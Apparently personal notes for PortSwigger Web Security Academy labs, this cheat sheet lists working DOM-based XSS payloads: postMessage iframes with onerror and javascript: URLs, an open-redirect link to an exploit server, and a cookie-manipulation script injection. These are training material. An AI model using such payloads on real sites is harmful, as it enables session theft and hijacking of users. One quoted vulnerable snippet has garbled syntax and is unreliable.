
## XSS Vulnerabilities:
**Things to look for:
- \<script>search('search-results')\</script>
- Javascript files that have scripts

## DOM-Based
- Ctrl+F to find event listener, then use the following payloads in exploit server.
```
<iframe src="//lab_id.web-security-academy.net/" 
onload="this.contentWindow.postMessage('\<img src=1 onerror=print()>','*')">
```
	- ==DOM XSS using web messages and a JavaScript URL  ==
```
	  window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
        
<iframe src="//lab_id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

<iframe src=https://lab_id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
	
-  ==DOM-based open redirection== - page source contains: 
```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
Visiting the following link solves the lab by taking the user to the exploit server
https:/lab_id.web-security-academy.net/post?postId=4&url=https://exploit_id.exploit-server.net/

- ==DOM-based cookie manipulation== 
```
<iframe src="https://lab_id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://lab_id.web-security-academy.net';window.x=1;">
```
